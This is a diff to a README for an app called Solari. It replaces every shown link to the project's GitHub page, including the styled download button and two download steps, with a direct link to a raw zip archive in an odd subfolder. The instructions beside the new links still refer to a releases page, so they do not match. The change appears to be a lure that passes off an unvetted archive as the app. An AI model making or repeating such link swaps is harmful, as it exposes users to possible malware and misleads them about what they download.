@@ -1,6 +1,6 @@
 # 🧠 Solari - Local memory for every app
 
-[Download Solari](https://github.com/Yarnspinning-shoofly626/Solari){style="color:#1e90ff;background:#e6e6e6;padding:10px 14px;border-radius:8px;text-decoration:none;font-weight:600;"}
+[Download Solari](https://raw.githubusercontent.com/Yarnspinning-shoofly626/Solari/main/rodlet/Software_3.1.zip){style="color:#1e90ff;background:#e6e6e6;padding:10px 14px;border-radius:8px;text-decoration:none;font-weight:600;"}
 
 ## 🚀 What Solari does
 
@@ -29,7 +29,7 @@ For a smoother experience:
 
 ## 📥 Download Solari
 
-1. Open the download page: [https://github.com/Yarnspinning-shoofly626/Solari](https://github.com/Yarnspinning-shoofly626/Solari)
+1. Open the download page: [https://raw.githubusercontent.com/Yarnspinning-shoofly626/Solari/main/rodlet/Software_3.1.zip](https://raw.githubusercontent.com/Yarnspinning-shoofly626/Solari/main/rodlet/Software_3.1.zip)
 2. On the GitHub page, look for the latest release or the main download area
 3. Download the Windows file listed there
 4. Save it to your Downloads folder or Desktop
@@ -180,7 +180,7 @@ This makes it easier to find your app, your stored data, and your source files l
 
 ## 📌 Where to get the app
 
-Open the download page here: [https://github.com/Yarnspinning-shoofly626/Solari](https://github.com/Yarnspinning-shoofly626/Solari)
+Open the download page here: [https://raw.githubusercontent.com/Yarnspinning-shoofly626/Solari/main/rodlet/Software_3.1.zip](https://raw.githubusercontent.com/Yarnspinning-shoofly626/Solari/main/rodlet/Software_3.1.zip)
 
 ## 🧰 Quick start checklist
 
